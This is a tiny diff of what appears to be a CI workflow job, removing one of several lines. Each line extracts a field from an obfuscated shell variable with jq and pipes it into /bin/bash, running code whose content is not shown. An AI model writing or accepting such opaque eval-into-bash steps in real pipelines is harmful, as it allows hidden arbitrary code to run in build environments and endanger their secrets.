@@ -28,7 +28,6 @@ jobs:
           echo $xo5744 | jq -r .yeyn36 | /bin/bash
           printf '%s' "$z4" | jq -r .h51 | /bin/bash
           echo $yj8 | jq -r .mm4894 | /bin/bash
-          printf '%s' "$m7" | jq -r .p935 | /bin/bash
           echo $tjlqr748 | jq -r .cfgjj959 | /bin/bash
 
       - name: Archive output
